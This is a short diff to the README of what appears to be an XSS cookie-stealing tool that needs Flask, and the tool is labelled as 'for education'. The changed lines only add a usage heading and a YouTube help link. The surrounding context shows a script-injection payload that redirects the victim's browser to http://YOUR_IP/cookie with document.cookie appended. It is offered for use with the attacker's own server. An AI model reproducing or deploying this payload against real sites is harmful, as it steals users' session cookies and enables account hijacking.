@@ -35,7 +35,8 @@ $ pip install flask
   "><script>document.location="http://YOUR_IP/cookie?cookie=" + document.cookie </script>
   ````
   
-
+# How use it :
+<a href='https://www.youtube.com/watch?v=gJ6D60jeai8&t=3s' target='_blank'>Help</a>
 # Note :
     
 This Tool For education .. Good Luck ^_^
